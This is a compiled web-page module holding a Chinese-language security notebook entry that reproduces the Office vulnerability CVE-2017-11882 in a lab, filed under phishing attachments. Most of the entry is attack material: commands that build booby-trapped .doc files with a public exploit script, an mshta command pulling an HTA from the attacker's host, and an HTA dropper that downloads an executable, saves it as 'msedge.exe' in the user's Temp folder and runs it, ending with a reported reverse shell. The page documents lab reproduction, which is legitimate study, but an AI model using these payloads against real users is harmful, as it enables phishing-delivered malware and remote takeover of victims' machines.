import{_ as t}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as i,a,o as s}from"./app-CFt4SMiv.js";const l={};function r(n,e){return s(),i("div",null,e[0]||(e[0]=[a(`<h1 id="cve-2017-11882" tabindex="-1"><a class="header-anchor" href="#cve-2017-11882"><span>CVE-2017-11882</span></a></h1><blockquote><p><a href="https://www.sqlsec.com/2020/10/office.html" target="_blank" rel="noopener noreferrer">CVE-2017-11882 Office RCE 复现 | 国光 (sqlsec.com)</a></p></blockquote><hr><ul><li><a href="#cve-2017-11882">CVE-2017-11882</a><ul><li><a href="#%E7%AE%80%E4%BB%8B">简介</a></li><li><a href="#%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83">复现环境</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">漏洞复现</a></li><li><a href="#%E5%8F%82%E8%80%83%E6%9D%90%E6%96%99">参考材料</a></li></ul></li></ul><hr><h2 id="简介" tabindex="-1"><a class="header-anchor" href="#简介"><span>简介</span></a></h2><p>潜伏 17 年之久的 Office 远程代码执行漏洞（CVE-2017-11882）影响版本从 Office 2000 到当时最新的 Office 2016，攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。</p><hr><h2 id="复现环境" tabindex="-1"><a class="header-anchor" href="#复现环境"><span>复现环境</span></a></h2><ul><li><p>靶机:</p><ul><li><a href="https://next.itellyou.cn/Original/#cbp=Product?ID=6f677346-0a09-43fa-b60d-e878ed7625a0" target="_blank" rel="noopener noreferrer">Win7SP1旗舰版</a>+<a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener noreferrer">Office2016</a></li><li>IP: <code>192.168.1.14</code></li></ul></li><li><p>攻击机 Kali</p><ul><li>IP: <code>100.1.1.131</code></li></ul></li></ul><hr><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现"><span>漏洞复现</span></a></h2><p>利用 <a href="https://github.com/Ridter/CVE-2017-11882" target="_blank" rel="noopener noreferrer">GitHub - Ridter/CVE-2017-11882: CVE-2017-11882 from https://github.com/embedi/CVE-2017-11882</a> 中的 <a href="https://github.com/Ridter/CVE-2017-11882/blob/master/Command109b_CVE-2017-11882.py" target="_blank" rel="noopener noreferrer">Command109b_CVE-2017-11882.py</a> 生成带命令的 doc 文件</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">python2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Command109b_CVE-2017-11882.py</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;cmd.exe /c calc.exe&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> calc.doc</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406170554036.png" alt="image-20240617055440013"></p><p>受害者打开此文档即会弹出计算器</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406170558724.png" alt="image-20240617055823640"></p><hr><p>试了下一些下载与执行文件的命令，效果都不是很理想，试下来似乎只适合短链命令，例如结合mshta脚本使用</p><p><code>calc.hta</code></p><div class="language-htaccess line-numbers-mode" data-highlighter="shiki" data-ext="htaccess" data-title="htaccess" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;script&gt;</span></span>
<span class="line"><span>    new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);</span></span>
<span class="line"><span>&lt;/script&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">python2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Command109b_CVE-2017-11882.py</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;mshta http://100.1.1.131:8000/download/calc.hta&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> htacalc.doc</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406170647275.png" alt="image-20240617064749124"></p><hr><p><code>deexe.hta</code></p><div class="language-htaccess line-numbers-mode" data-highlighter="shiki" data-ext="htaccess" data-title="htaccess" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;script&gt;</span></span>
<span class="line"><span>var url = &#39;http://100.1.1.131:8000/download/normal.exe&#39;;var network = new ActiveXObject(&#39;WScript.Network&#39;);var username = network.UserName;var downloadPath = &#39;C:\\\\Users\\\\&#39; + username + &#39;\\\\AppData\\\\Local\\\\Temp\\\\msedge.exe&#39;;var xmlhttp = new ActiveXObject(&#39;MSXML2.XMLHTTP&#39;);xmlhttp.open(&#39;GET&#39;, url, false);xmlhttp.send();var stream = new ActiveXObject(&#39;ADODB.Stream&#39;);stream.Open();stream.Type = 1;stream.Write(xmlhttp.responseBody);stream.Position = 0;stream.SaveToFile(downloadPath, 2); stream.Close();var shell = new ActiveXObject(&#39;WScript.Shell&#39;);shell.Run(downloadPath);</span></span>
<span class="line"><span>&lt;/script&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406170655737.png" alt="image-20240617065522463"></p><p>如果遇到上述错误需要 <code>ie--&gt;Internet选项--&gt;安全--&gt;自定义级别--&gt;找到“通过域访问数据源”--&gt;选择“启用”。</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406170657155.png" alt="image-20240617065739113"></p><p>也可以直接把站点加到可信站点里来帮助复现</p><p>成功反弹shell：</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406170702490.png" alt="image-20240617070200444"></p><hr><h2 id="参考材料" tabindex="-1"><a class="header-anchor" href="#参考材料"><span>参考材料</span></a></h2><ul><li><p>分析</p></li><li><p>利用工具</p><ul><li><a href="https://github.com/Ridter/CVE-2017-11882" target="_blank" rel="noopener noreferrer">GitHub - Ridter/CVE-2017-11882: CVE-2017-11882 from https://github.com/embedi/CVE-2017-11882</a></li></ul></li><li><p>复现过程</p></li><li><p>检测对抗</p></li></ul>`,35)]))}const o=t(l,[["render",r],["__file","CVE-2017-11882.html.vue"]]),h=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2017-11882.html","title":"CVE-2017-11882","lang":"zh-CN","frontmatter":{"category":["网络安全","网络钓鱼"],"tags":["钓鱼附件","Office","Office漏洞","CVE-2017-11882"],"excerpt":"Microsoft Office 2007 Service Pack 3、Microsoft Office 2010 Service Pack 2、Microsoft Office 2013 Service Pack 1 和 Microsoft Office 2016 存在内存对象处理漏洞，允许攻击者以当前用户身份运行任意代码，该漏洞又称为“Microsoft Office 内存损坏漏洞”。此 CVE ID 与 CVE-2017-11884 不同。","description":"CVE-2017-11882 CVE-2017-11882 Office RCE 复现 | 国光 (sqlsec.com) CVE-2017-11882 简介 复现环境 漏洞复现 参考材料 简介 潜伏 17 年之久的 Office 远程代码执行漏洞（CVE-2017-11882）影响版本从 Office 2000 到当时最新的 Office 2016，...","head":[["meta",{"property":"og:url","content":"https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2017-11882.html"}],["meta",{"property":"og:site_name","content":"DailyNotes"}],["meta",{"property":"og:title","content":"CVE-2017-11882"}],["meta",{"property":"og:description","content":"CVE-2017-11882 CVE-2017-11882 Office RCE 复现 | 国光 (sqlsec.com) CVE-2017-11882 简介 复现环境 漏洞复现 参考材料 简介 潜伏 17 年之久的 Office 远程代码执行漏洞（CVE-2017-11882）影响版本从 Office 2000 到当时最新的 Office 2016，..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"http://cdn.ayusummer233.top/DailyNotes/202406170554036.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-04-17T03:32:15.000Z"}],["meta",{"property":"article:tag","content":"钓鱼附件"}],["meta",{"property":"article:tag","content":"Office"}],["meta",{"property":"article:tag","content":"Office漏洞"}],["meta",{"property":"article:tag","content":"CVE-2017-11882"}],["meta",{"property":"article:modified_time","content":"2025-04-17T03:32:15.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"CVE-2017-11882\\",\\"image\\":[\\"http://cdn.ayusummer233.top/DailyNotes/202406170554036.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202406170558724.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202406170647275.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202406170655737.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202406170657155.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202406170702490.png\\"],\\"dateModified\\":\\"2025-04-17T03:32:15.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"咸鱼型233\\",\\"url\\":\\"https://233official.github.io/dailynotes/\\"}]}"]],"date":"2024-06-17T00:37:21.000Z"},"headers":[{"level":2,"title":"简介","slug":"简介","link":"#简介","children":[]},{"level":2,"title":"复现环境","slug":"复现环境","link":"#复现环境","children":[]},{"level":2,"title":"漏洞复现","slug":"漏洞复现","link":"#漏洞复现","children":[]},{"level":2,"title":"参考材料","slug":"参考材料","link":"#参考材料","children":[]}],"git":{"createdTime":1718584641000,"updatedTime":1744860735000,"contributors":[{"name":"233Mac","username":"233Mac","email":"ayusummer233@vip.qq.com","commits":2,"url":"https://github.com/233Mac"},{"name":"233PC","username":"233PC","email":"ayusummer233@gmail.com","commits":1,"url":"https://github.com/233PC"}]},"readingTime":{"minutes":1.82,"words":547},"filePathRelative":"网络安全/钓鱼/钓鱼附件/Office/Office漏洞/CVE-2017-11882.md","localizedDate":"2024年6月17日","autoDesc":true}');export{o as comp,h as data};
